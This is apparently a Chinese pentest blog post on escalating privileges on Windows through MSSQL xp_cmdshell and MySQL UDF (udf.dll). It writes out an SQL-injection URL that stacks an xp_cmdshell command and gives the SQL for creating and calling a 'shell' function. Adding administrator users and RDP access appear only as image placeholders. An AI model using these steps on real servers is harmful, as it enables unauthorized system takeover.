+++
date = "2016-08-07T23:38:58+08:00"
description = ""
draft = false
tags = ["提权"]
title = "Windows下第三方服务提权"
topics = ["Pentest"]

+++

<center><h2>MSSQL和MySQL提权</h2></center>
## MSSQL提权
> MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权  
提权条件：数据库账号是DBA权限

#### 关于xp_cmdshell
* 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell 'net user';
* 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell 'net user';\-\-

#### 连接数据库
> {{% fluid_img src="/img/post/privilge_escalation_win_find_sql_conn_msg.png" alt="Windows下第三方服务提权-找数据库连接信息" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_conn_mssql.png" alt="Windows下第三方服务提权-连接mssql数据库" %}}

#### 执行系统命令
> {{% fluid_img src="/img/post/privilge_escalation_win_try_exec_sys_command.png" alt="Windows下第三方服务提权-尝试用xp_cmdshell执行命令" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_open_cmd_shell.png" alt="Windows下第三方服务提权-开启xp_cmdshell组件" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_exec_sys_command_success.png" alt="Windows下第三方服务提权-使用xp_cmdshell成功执行命令" %}}

#### 添加用户
> {{% fluid_img src="/img/post/privilge_escalation_win_add_user.png" alt="Windows下第三方服务提权-添加用户" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_view_user.png" alt="Windows下第三方服务提权-查看添加的用户" %}}

#### 远程连接
> {{% fluid_img src="/img/post/privilge_escalation_win_remote_conn.png" alt="Windows下第三方服务提权-远程连接" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_input_u_p.png" alt="Windows下第三方服务提权-输入用户名和密码" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_remote_connection_view_ip.png" alt="Windows下第三方服务提权-输入用户名和密码" %}}

<br /><br />

## MySQL提权
> 环境：web应用服务器权限较低  
提权条件：MySQL是system权限

#### 关于UDF
> MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。

#### UDF提权过程
* 导入udf.dll到服务器指定目录  
	* MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下  
	* MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建
* 使用SQL语句创建功能函数  
	CREATE FUNCTION shell RETURNS STRING SONAME 'udf.dll';
* 执行MySQL语句调用新创建的函数  
	select shell('cmd','whoami');
* 删除创建的函数  
	drop function shell;

#### 查看基本信息
> {{% fluid_img src="/img/post/privilge_escalation_win_view_base_msg.png" alt="Windows下第三方服务提权-查看基本信息" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_view_current_user.png" alt="Windows下第三方服务提权-查看当前用户" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_view_current_user_permissions.png" alt="Windows下第三方服务提权-查看当前用户权限" %}}

#### 上传udf提权
> {{% fluid_img src="/img/post/privilge_escalation_win_upload_udf.png" alt="Windows下第三方服务提权-上传udf" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_conn_mysql.png" alt="Windows下第三方服务提权-连接数据库" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_export_udf.png" alt="Windows下第三方服务提权-导出udf.dll并生成函数" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_exec_whoami.png" alt="Windows下第三方服务提权-提权成功执行whoami" %}}

#### 添加用户
> {{% fluid_img src="/img/post/privilge_escalation_win_shell_add_user.png" alt="Windows下第三方服务提权-通过shell函数添加用户" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_shell_add_user_to_administrators.png" alt="Windows下第三方服务提权-通过shell函数添加用户到管理员组" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_shell_active_user.png" alt="Windows下第三方服务提权-通过shell函数激活用户" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_shell_view_user.png" alt="Windows下第三方服务提权-通过shell函数查看用户" %}}

#### 远程连接
> {{% fluid_img src="/img/post/privilge_escalation_win_shell_remote_connection.png" alt="Windows下第三方服务提权-远程3389连接" %}}